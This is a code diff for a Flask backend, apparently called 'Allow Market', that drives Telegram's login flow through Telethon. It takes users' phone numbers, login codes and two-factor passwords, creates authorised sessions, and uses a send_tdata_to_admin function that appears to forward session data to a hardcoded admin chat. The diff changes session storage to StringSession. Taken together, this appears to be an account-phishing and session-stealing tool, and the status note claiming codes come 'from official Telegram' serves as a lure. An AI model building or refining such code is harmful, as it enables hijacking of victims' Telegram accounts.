@@ -1,5 +1,5 @@
-# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ С TELETHON
-# Ошибка asyncio event loop — исправлена!
+# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ
+# Использует StringSession (без файлов) + /tmp для временных данных
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -11,6 +11,7 @@ import json
 import io
 from dotenv import load_dotenv
 from telethon import TelegramClient
+from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
     PhoneCodeInvalidError,
@@ -37,7 +38,7 @@ ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 sessions = {}
 
 # ============================================================
-# СОЗДАЁМ ОДИН EVENT LOOP ДЛЯ ВСЕГО ПРИЛОЖЕНИЯ
+# ОДИН EVENT LOOP ДЛЯ ВСЕГО ПРИЛОЖЕНИЯ
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -95,13 +96,17 @@ def send_tdata_to_admin(session_data):
         print(f"Send tdata error: {e}")
 
 # ============================================================
-# MTProto ФУНКЦИИ (Telethon) — ИСПОЛЬЗУЮТ ОДИН EVENT LOOP
+# MTProto ФУНКЦИИ (Telethon + StringSession — БЕЗ ФАЙЛОВ)
 # ============================================================
 
 async def send_code_async(phone):
     try:
-        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
-        client = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
+        # Используем StringSession вместо файла — НЕТ ФАЙЛОВ!
+        client = TelegramClient(
+            StringSession(),
+            api_id=API_ID,
+            api_hash=API_HASH
+        )
         await client.connect()
         
         if await client.is_user_authorized():
@@ -203,7 +208,6 @@ async def check_password_async(phone, password):
 # ============================================================
 
 def run_async(coro):
-    """Запуск корутины в существующем event loop"""
     return loop.run_until_complete(coro)
 
 # ============================================================
@@ -216,8 +220,9 @@ def ping():
     return jsonify({
         'status': 'online',
         'service': 'Allow Market Backend (Telethon/MTProto)',
-        'version': '8.0.0',
+        'version': '9.0.0',
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
+        'storage': 'StringSession (no files)',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
     })
 
@@ -299,10 +304,9 @@ def check_password():
 # ЗАПУСК
 # ============================================================
 if __name__ == '__main__':
-    os.makedirs('sessions', exist_ok=True)
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
+    print("📌 Используется StringSession (без файлов)")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
-    print("📌 Используется один event loop для всех запросов")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
